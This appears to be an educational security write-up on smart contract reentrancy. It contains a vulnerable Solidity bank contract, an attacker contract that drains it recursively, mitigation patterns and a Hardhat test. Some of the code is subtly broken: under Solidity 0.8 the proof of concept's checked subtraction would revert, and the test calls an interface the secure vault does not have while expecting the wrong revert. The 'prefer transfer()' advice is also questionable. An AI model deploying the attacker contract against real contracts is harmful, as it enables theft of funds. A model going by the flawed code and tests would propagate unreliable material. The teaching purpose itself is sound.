# Smart Contract Reentrancy Attack

## Overview

Reentrancy is one of the most critical vulnerabilities in smart contracts, where an external contract can recursively call back into the vulnerable contract before the first invocation completes. This can lead to unexpected behavior, fund drainage, and state manipulation.

**Severity**: Critical  
**Category**: Smart Contract Security  
**CWE**: CWE-841

## Technical Explanation

Reentrancy occurs when a contract makes an external call to another untrusted contract before updating its own state. The external contract can then call back into the original contract, exploiting the inconsistent state.

### Vulnerability Pattern

1. Contract A calls Contract B (external call)
2. Contract B calls back into Contract A (reentrant call)
3. Contract A's state hasn't been updated yet
4. Contract B exploits the stale state

## Attack Scenario

The infamous DAO hack (2016) exploited a reentrancy vulnerability, draining 3.6 million ETH ($50M at the time).

## Proof of Concept

### Vulnerable Contract

```solidity
// VULNERABLE: Classic reentrancy vulnerability
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State updated AFTER external call
        balances[msg.sender] -= amount;
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

### Attack Contract

```solidity
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IVulnerableBank public vulnerableBank;
    uint256 public constant AMOUNT = 1 ether;
    
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = IVulnerableBank(_vulnerableBankAddress);
    }
    
    // Initiate attack
    function attack() external payable {
        require(msg.value >= AMOUNT, "Need at least 1 ETH");
        
        // Deposit funds
        vulnerableBank.deposit{value: AMOUNT}();
        
        // Start reentrancy attack
        vulnerableBank.withdraw(AMOUNT);
    }
    
    // Fallback function - called when receiving ETH
    receive() external payable {
        // Reentrant call
        if (address(vulnerableBank).balance >= AMOUNT) {
            vulnerableBank.withdraw(AMOUNT);
        }
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

### Attack Flow

```
1. Attacker deposits 1 ETH
2. Attacker calls withdraw(1 ETH)
3. VulnerableBank sends 1 ETH to attacker
4. Attacker's receive() is triggered
5. Attacker calls withdraw(1 ETH) again (balance not updated yet!)
6. VulnerableBank sends another 1 ETH
7. Steps 4-6 repeat until bank is drained
```

## Impact

- Complete fund drainage
- State manipulation
- Protocol insolvency
- Loss of user funds
- Smart contract failure

**Real-World Examples**:
- The DAO Hack (2016): $50M stolen
- Cream Finance (2021): $130M stolen
- Grim Finance (2021): $30M stolen

## Mitigation

### 1. Checks-Effects-Interactions Pattern

```solidity
pragma solidity ^0.8.0;

contract SecureBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public {
        // CHECKS
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // EFFECTS - Update state BEFORE external call
        balances[msg.sender] -= amount;
        
        // INTERACTIONS - External call last
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### 2. ReentrancyGuard Modifier

```solidity
pragma solidity ^0.8.0;

contract ReentrancyGuard {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    
    uint256 private status;
    
    constructor() {
        status = NOT_ENTERED;
    }
    
    modifier nonReentrant() {
        require(status != ENTERED, "ReentrancyGuard: reentrant call");
        
        status = ENTERED;
        _;
        status = NOT_ENTERED;
    }
}

contract SecureBankWithGuard is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### 3. Using OpenZeppelin's ReentrancyGuard

```solidity
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBankOZ is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### 4. Pull Over Push Pattern

```solidity
pragma solidity ^0.8.0;

contract PullPayment {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public pendingWithdrawals;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // Request withdrawal (no external call)
    function requestWithdrawal(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        pendingWithdrawals[msg.sender] += amount;
    }
    
    // User pulls their funds
    function withdraw() public {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No pending withdrawal");
        
        pendingWithdrawals[msg.sender] = 0;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### 5. Mutex Lock Pattern

```solidity
pragma solidity ^0.8.0;

contract MutexProtected {
    mapping(address => uint256) public balances;
    bool private locked;
    
    modifier noReentrancy() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public noReentrancy {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

## Secure Code Example

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title SecureVault
 * @dev Secure vault implementation with multiple protection layers
 */
contract SecureVault is ReentrancyGuard, Ownable {
    // State variables
    mapping(address => uint256) private balances;
    mapping(address => uint256) private pendingWithdrawals;
    
    uint256 public totalDeposits;
    uint256 public constant MAX_WITHDRAWAL = 100 ether;
    
    // Events
    event Deposit(address indexed user, uint256 amount);
    event WithdrawalRequested(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    
    // Modifiers
    modifier validAmount(uint256 amount) {
        require(amount > 0, "Amount must be greater than 0");
        require(amount <= MAX_WITHDRAWAL, "Amount exceeds maximum");
        _;
    }
    
    /**
     * @dev Deposit funds into the vault
     */
    function deposit() external payable {
        require(msg.value > 0, "Must send ETH");
        
        // EFFECTS: Update state first
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @dev Request withdrawal (pull pattern)
     */
    function requestWithdrawal(uint256 amount) 
        external 
        validAmount(amount) 
        nonReentrant 
    {
        // CHECKS
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // EFFECTS: Update state before any external interaction
        balances[msg.sender] -= amount;
        pendingWithdrawals[msg.sender] += amount;
        totalDeposits -= amount;
        
        emit WithdrawalRequested(msg.sender, amount);
    }
    
    /**
     * @dev Execute pending withdrawal
     */
    function withdraw() external nonReentrant {
        uint256 amount = pendingWithdrawals[msg.sender];
        
        // CHECKS
        require(amount > 0, "No pending withdrawal");
        require(address(this).balance >= amount, "Insufficient contract balance");
        
        // EFFECTS: Update state before external call
        pendingWithdrawals[msg.sender] = 0;
        
        // INTERACTIONS: External call last
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawn(msg.sender, amount);
    }
    
    /**
     * @dev Get user balance
     */
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
    
    /**
     * @dev Get pending withdrawal amount
     */
    function getPendingWithdrawal(address user) external view returns (uint256) {
        return pendingWithdrawals[user];
    }
    
    /**
     * @dev Emergency withdrawal by owner
     */
    function emergencyWithdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        (bool success, ) = owner().call{value: balance}("");
        require(success, "Emergency withdrawal failed");
    }
    
    /**
     * @dev Get contract balance
     */
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## Security Takeaways

1. Always follow Checks-Effects-Interactions pattern
2. Update state before external calls
3. Use ReentrancyGuard for critical functions
4. Implement pull over push payment pattern
5. Avoid using call() when possible, prefer transfer()
6. Conduct thorough security audits
7. Use established libraries (OpenZeppelin)
8. Implement circuit breakers for emergencies
9. Test with reentrancy attack scenarios
10. Monitor for suspicious transaction patterns

## Testing for Reentrancy

```javascript
// Hardhat test example
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reentrancy Attack Test", function () {
    it("Should prevent reentrancy attack", async function () {
        const [owner, attacker] = await ethers.getSigners();
        
        // Deploy vulnerable contract
        const SecureVault = await ethers.getContractFactory("SecureVault");
        const vault = await SecureVault.deploy();
        
        // Deploy attacker contract
        const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
        const attackerContract = await Attacker.deploy(vault.address);
        
        // Deposit funds
        await vault.connect(owner).deposit({ value: ethers.utils.parseEther("10") });
        
        // Attempt attack
        await expect(
            attackerContract.connect(attacker).attack({ 
                value: ethers.utils.parseEther("1") 
            })
        ).to.be.revertedWith("ReentrancyGuard: reentrant call");
    });
});
```

## References

- [Consensys Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/)
- [OpenZeppelin Security](https://docs.openzeppelin.com/contracts/4.x/api/security)
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [The DAO Hack Explained](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao)

